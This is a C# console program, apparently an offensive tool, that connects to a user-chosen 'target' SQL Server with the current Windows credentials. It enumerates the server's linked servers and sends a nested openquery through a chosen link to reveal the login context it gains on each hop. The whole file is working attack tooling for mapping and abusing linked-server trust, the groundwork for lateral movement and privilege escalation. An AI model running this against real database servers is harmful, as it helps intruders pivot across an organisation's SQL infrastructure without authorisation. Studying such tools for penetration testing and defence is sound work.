using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;

namespace MsSqlLinkedServerCodeExec
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("[*] Enter target sql server: ");
            String sqlServer = Console.ReadLine();
            Console.Write("[*] Enter target database: ");
            String sqlDatabase = Console.ReadLine();
            String sqlConn = $"Server = {sqlServer}; Database = {sqlDatabase}; Integrated Security = True;";
            SqlConnection conn = new SqlConnection(sqlConn);
            String localCmd = "select system_user;";
            String execCmd = "exec sp_linkedservers;";

            try
            {
                conn.Open();
                Console.WriteLine("[+] Authentication successful");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failure");
                Environment.Exit(0);
            }

            SqlCommand command = new SqlCommand(localCmd, conn);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine($"[+] Executing as {reader[0]} on {sqlServer}");
            reader.Close();

            command = new SqlCommand(execCmd, conn);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine($"[+] SQL server {reader[0]} found with link to {sqlServer} found");
            }
            reader.Close();

            Console.Write("[*] Enter new target server: ");
            String newTarget = Console.ReadLine();

            execCmd = $"select mylogin from openquery(\"{newTarget}\", 'select mylogin from openquery(\"{sqlServer}\", ''select SYSTEM_USER as mylogin'')');";
            command = new SqlCommand(execCmd, conn);
            reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine($"[+] Executing as {reader[0]} on {newTarget}");
            }
            reader.Close();

            conn.Close();
        }
    }
}